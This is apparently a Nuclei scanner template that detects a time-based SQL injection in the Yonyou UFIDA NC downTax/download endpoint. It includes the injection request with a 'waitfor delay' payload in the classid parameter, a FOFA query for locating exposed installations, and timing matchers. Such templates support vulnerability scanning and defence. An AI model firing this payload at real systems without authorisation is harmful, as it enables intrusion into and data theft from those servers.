id: yonyou-nc-downtax-download-sqli

info:
  name: 用友 UFIDA NC downTax/download - sqli
  author: leadlife
  severity: high
  description: 用友NC65系统中的downTax接口存在SQL注入漏洞。攻击者可以利用接口中的classid参数进行SQL注入，从而窃取服务器的敏感信息。
  reference:
    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BNC-downTax%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    fofa-query: icon_hash="1085941792" || app="用友-UFIDA-NC"
  tags: yonyou,sqli,nc,oa,time

http:
  - raw:
      - |
        @timeout: 15s
        GET /portal/pt/downTax/download?pageId=login&classid=1'waitfor+delay+'0:0:6'-- HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - duration >= 5 && duration < 9
          - status_code == 500
          - contains(body,'没有下载到数据')
        condition: and
